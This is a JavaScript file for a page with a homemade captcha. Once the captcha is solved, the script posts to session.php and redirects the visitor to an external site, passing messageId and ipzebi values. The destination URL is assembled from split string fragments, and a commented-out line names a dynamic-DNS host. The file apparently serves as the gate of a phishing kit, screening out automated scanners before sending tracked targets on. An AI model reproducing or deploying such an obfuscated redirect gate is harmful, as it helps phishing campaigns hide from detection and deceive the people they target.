function pauseForOneSecond() {
  console.log('Start');
  setTimeout(function() {
      console.log('Pause for 1 second');
      // Code to execute after the pause
  }, 1000);

  console.log('End');
}
// Call the function
function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      result += characters.charAt(randomIndex);
  }

  return result;
}
let i = 0
function checkInput() {
  var userInput = document.getElementById('userInput').value;
  var randomString = document.getElementById('randomStringSpan').textContent;
  var errorMsg = document.getElementById('errorMsg');
  var messageId = document.getElementById('messageId').value;
  var ipzebi = document.getElementById('ipzebi').value;
  let spark = "www.nevergiveupme"
  let https = "http"
  let webapp = "/target"
  // This part ensures the captcha value is included in the request
  var dataToSend = "captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi);
  if (userInput.toLowerCase() === randomString.toLowerCase()) {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "session.php", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.onreadystatechange = function() {
          if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
              // Parse JSON response from setSession.php
              var response = JSON.parse(this.responseText);
              if (response.status === 'success') {
                  //alert(1);
                  // Success: Proceed with the redirection or next steps
                  // Adjust the URL as needed for your application
                  window.location= https+"://"+spark+".com"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
                  //window.location = "http://localhost/target/target?messageId=" + messageId + "&ipzebi=" + ipzebi; http://auttarget.hopto.org/
              } else {
                  // Failure: Handle it, maybe show an error message
                  console.error('Session setting failed:', response.message);
                  errorMsg.textContent = 'Session setup failed. Please try again.';
              }
          }
      };
      xhr.send(dataToSend);
  } else {
      errorMsg.textContent = 'Wrong captcha. Please try again.';
      setTimeout(function() {
          errorMsg.textContent = '';
      }, 3000);
  }
}
// Example usage:
const randomString = generateRandomString(6);
let redirect_url = "https://rroll.to/"
// Display the random string in the span element
const spanElement = document.getElementById('randomStringSpan');
spanElement.textContent = randomString;